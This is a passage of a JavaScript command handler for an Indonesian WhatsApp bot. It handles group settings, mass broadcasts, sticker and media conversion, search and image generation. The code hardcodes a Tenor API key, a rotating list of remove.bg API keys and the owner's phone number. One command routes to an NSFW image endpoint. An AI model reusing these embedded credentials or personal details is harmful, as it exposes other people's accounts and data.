                        { buttonId: 'group open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'group close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `Mode Group`, kiki.user.name, m)

             }
            }
            break
            case 'editinfo': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
             if (args[0] === 'open'){
                await kiki.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else if (args[0] === 'close'){
                await kiki.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
             } else {
             let buttons = [
                        { buttonId: 'editinfo open', buttonText: { displayText: 'Open' }, type: 1 },
                        { buttonId: 'editinfo close', buttonText: { displayText: 'Close' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `Mode Edit Info`, kiki.user.name, m)

            }
            }
            break
            case 'antilink': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].antilink) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = true
                m.reply(`Antilink Aktif !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].antilink) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].antilink = false
                m.reply(`Antilink Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'antilink on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'antilink off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `Mode Antilink`, kiki.user.name, m)
                }
             }
             break
             case 'mute': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${kiki.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${kiki.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'mute on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'mute off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await kiki.sendButtonText(m.chat, buttons, `Mute Bot`, kiki.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!m.isGroup) throw mess.group
                let response = await kiki.groupInviteCode(m.chat)
                kiki.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'ephemeral': {
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (!text) throw 'Masukkan value enable/disable'
                if (args[0] === 'enable') {
                    await kiki.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                } else if (args[0] === 'disable') {
                    await kiki.sendMessage(m.chat, { disappearingMessagesInChat: false }).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
                }
            }
            break
            case 'delete': case 'del': {
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                kiki.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await kiki.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Youtube Owner',
                                    url: 'https://youtube.com/channel/UCjjuhOD-Mt2XrKFptMVDysQ'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 858-9587-3474'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Grup Owner',
                                    id: 'grupowner'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      kiki.send5ButImg(i, txt, kiki.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Yotube Owner',
                                    url: 'https://youtube.com/channel/UCjjuhOD-Mt2XrKFptMVDysQ'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 858-9587-3474'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Grup Owner',
                                    id: 'grupowner'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      kiki.send5ButImg(yoi, txt, kiki.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            case 'infochat': {
                if (!m.quoted) m.reply('Reply Pesan')
                let msg = await m.getQuotedObj()
                if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                let teks = ''
                for (let i of msg.userReceipt) {
                    let read = i.readTimestamp
                    let unread = i.receiptTimestamp
                    let waktu = read ? read : unread
                    teks += ` @${i.userJid.split('@')[0]}\n`
                    teks += ` ┗━ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')}  *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
                }
                kiki.sendTextWithMentions(m.chat, teks, m)
            }
            break
            case 'q': case 'quoted': {
		if (!m.quoted) return m.reply('Reply Pesannya!!')
		let wokwol = await kiki.serializeM(await m.getQuotedObj())
		if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
		await wokwol.quoted.copyNForward(m.chat, true)
            }
	    break
            case 'listpc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
                 for (let i of anu) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 kiki.sendTextWithMentions(m.chat, teks, m)
             }
             break
                case 'listgc': {
                 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
                 for (let i of anu) {
                     let metadata = await kiki.groupMetadata(i)
                     teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* @${metadata.owner.split('@')[0]}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 kiki.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'listonline': case 'liston': {
                    let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
                    let online = [...Object.keys(store.presences[id]), botNumber]
                    kiki.sendText(m.chat, 'List Online:\n\n' + online.map(v => ' @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
             }
             break
            case 'sticker': case 's': case 'stickergif': case 'sgif': {
            if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
                    if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await kiki.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
                let media = await quoted.download()
                let encmedia = await kiki.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
                await fs.unlinkSync(encmedia)
            } else {
                throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
                }
            }
            break
            case 'ebinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { eBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let eb = await eBinary(teks)
            m.reply(eb)
        }
        break
            case 'dbinary': {
            if (!m.quoted.text && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
            let { dBinary } = require('./lib/binary')
            let teks = text ? text : m.quoted && m.quoted.text ? m.quoted.text : m.text
            let db = await dBinary(teks)
            m.reply(db)
        }
        break
            case 'emojimix': {
	        if (!text) throw `Example : ${prefix + command} 😅+🤔`
		let [emoji1, emoji2] = text.split`+`
		let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anu.results) {
		    let encmedia = await kiki.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    await fs.unlinkSync(encmedia)
		}
	    }
	    break
            case 'toimage': case 'toimg': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await kiki.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    kiki.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await kiki.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await kiki.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            kiki.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            kiki.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${kiki.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            kiki.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await kiki.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await kiki.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await kiki.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await kiki.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    kiki.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += ` No : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Upload At : ${i.ago}\n Author : ${i.author.name}\n Url : ${i.url}\n\n─────────────────\n\n`
                }
                kiki.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += ` *Title* : ${g.title}\n`
                teks += ` *Description* : ${g.snippet}\n`
                teks += ` *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: kiki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
 Title : ${anu.title}
 Ext : Search
 ID : ${anu.videoId}
 Duration : ${anu.timestamp}
 Viewers : ${anu.views}
 Upload At : ${anu.ago}
 Author : ${anu.author.name}
 Channel : ${anu.author.url}
 Description : ${anu.description}
 Url : ${anu.url}`,
                    footer: kiki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                kiki.sendImage(m.chat, media.thumb, ` Title : ${media.title}\n File Size : ${media.filesizeF}\n Url : ${isUrl(text)}\n Ext : MP3\n Resolusi : ${args[1] || '128kbps'}`, m)
                kiki.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                kiki.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: ` Title : ${media.title}\n File Size : ${media.filesizeF}\n Url : ${isUrl(text)}\n Ext : MP3\n Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                kiki.sendImage(m.chat, media.thumb, ` Title : ${media.title}\n File Size : ${media.filesizeF}\n Url : ${urls[text - 1]}\n Ext : MP3\n Resolusi : ${args[1] || '128kbps'}`, m)
                kiki.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                kiki.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: ` Title : ${media.title}\n File Size : ${media.filesizeF}\n Url : ${urls[text - 1]}\n Ext : MP3\n Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                kiki.sendMessage(m.chat, { image: { url: result }, caption: ' Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
                m.reply(mess.wait)
                kiki.sendMessage(m.chat, { image: { url: api('riykey', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                kiki.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                kiki.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: kiki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: ` Title : ${result.title}\n Category : ${result.type}\n Detail : ${result.source}\n Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: kiki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: ` Title : ${result.title}\n Source : ${result.source}\n Media Url : ${result.image}`,
                    footer: kiki.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
                let anu = await fetchJson(api('riykey', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                kiki.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
             if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                kiki.sendMessage(m.chat, { image: { url: api('riykey', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                   if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                kiki.sendMessage(m.chat, { image: { url: api('riykey', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                   if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply(mess.endLimit) // respon ketika limit habis
		            db.data.users[m.sender].limit -= 1 // -1 limit
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                kiki.sendMessage(m.chat, { image: { url: api('riykey', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nomor HP :* ${anu.message.nomer_hp}\n *Angka Shuzi :* ${anu.message.angka_shuzi}\n *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Mimpi :* ${anu.message.mimpi}\n *Arti :* ${anu.message.arti}\n *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                kiki.sendText(m.chat, ` *Nama Anda :* ${anu.message.nama_anda.nama}\n *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n *Hasil :* ${anu.message.result}\n *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
